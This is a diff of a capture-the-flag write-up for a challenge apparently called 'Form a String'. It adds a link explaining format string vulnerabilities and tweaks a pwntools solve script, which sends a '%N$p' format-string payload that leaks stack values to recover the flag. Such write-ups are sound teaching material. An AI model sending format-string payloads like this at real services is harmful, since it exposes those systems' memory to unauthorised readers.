@@ -16,6 +16,8 @@ https://imaginary.ml/r/BC4B-Form_a_String.rar
 
 ## Solution
 
+This challenge had to do with the [form a string vulnerability](https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/)
+
 ```py
 from pwn import *
 from Crypto.Util.number import long_to_bytes
@@ -28,7 +30,7 @@ for i in range(1, 25):
     query += "%{}$p ".format(str(i))
 
 r.sendline(query.encode())
-res = r.recvline().decode().split(" ")
+res = r.recvlineS().split(" ")
 #print(res)
 for i in res:
     try:
